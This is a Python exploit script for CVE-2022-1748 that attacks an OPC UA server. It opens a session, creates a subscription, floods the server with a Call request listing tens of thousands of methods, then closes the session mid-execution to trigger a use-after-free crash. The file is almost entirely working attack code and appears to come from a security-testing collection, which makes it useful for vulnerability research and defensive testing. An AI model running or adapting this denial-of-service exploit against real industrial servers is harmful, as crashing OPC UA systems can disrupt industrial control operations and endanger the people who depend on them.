# Function Call in a Non-existent Session Attack
#   Triggering a application crash after several OPC UA methods have been called and the OPC UA session is closed before the methods have been finished.
#
# CVEs:
#   - CVE-2022-1748: https://industrial.softing.com/fileadmin/psirt/downloads/syt-2022-7.html
#

import datetime

from protocol import *
from config import *

def attack(server_details):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.session_timeout = 4294967295
    opcua.create_session()

    ### Add subscription ###
    message_header = opcua.build_opcua_message_header()
    message_body = b""
    message_body += b"\x01\x00"  # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
    message_body += b"\x13\x03"  # Create Subscription request
    message_body += OBJECT.build(opcua.auth_id)  # Auth token
    create_subscription_body = bytes.fromhex("81f893276ce7d7014e000000ff030000ffffffff000000000000000000000000408f40e80300000a0000000000000001ff")
    message = message_header + message_body + create_subscription_body

    print("[-] Sending MSG Request - CreateSubscription")
    create_sub_response = opcua.send_recv(message, should_recv=True)
    subscription_id = create_sub_response[-20: -16]
    print("[-] Created Subscription with id {}".format(subscription_id))

    ### Call Request ###
    message_header = opcua.build_opcua_message_header()
    message_body = b""
    message_body += b"\x01\x00"  # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
    message_body += b"\xc8\x02"  # Call request
    message_body += OBJECT.build(opcua.auth_id)  # Auth token
    message_body += bytes.fromhex("f0ad852791f1d70142460f0000000000ffffffff10270000000000")

    # Create call with multiple methods
    number_of_methods = 0x6fff #0xff
    method = bytes.fromhex("0100cd080100e42c0100000007") + subscription_id
    methods = struct.pack("I", number_of_methods) + (method * number_of_methods)

    message = message_header + message_body + methods
    print("[-] Sending MSG Request - Call")

    ############################## !!!! ##############################
    # Send 10 times, without waiting and close the session. This will get most likely zero out the connection
    # data while the thread executing the methods still tries to access the session leading to access violation.
    opcua.send_recv(message, count=100, should_recv=False)
    ##################################################################

    # Close Session
    opcua.close()